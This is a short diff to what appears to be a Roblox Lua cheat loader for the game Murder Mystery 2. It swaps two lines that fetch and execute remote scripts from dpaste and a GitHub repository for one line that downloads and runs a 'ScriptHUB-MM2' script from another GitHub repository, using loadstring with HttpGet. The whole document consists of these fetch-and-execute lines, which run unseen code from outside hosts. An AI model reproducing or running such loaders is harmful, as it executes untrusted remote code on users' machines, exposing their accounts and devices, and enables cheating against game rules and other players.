@@ -1,3 +1,1 @@
-loadstring(game:HttpGet("https://dpaste.org/7cvj1/raw", true))()
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/crt4r/MM2-Scripts/refs/heads/main/ScriptHUB-MM2"))()
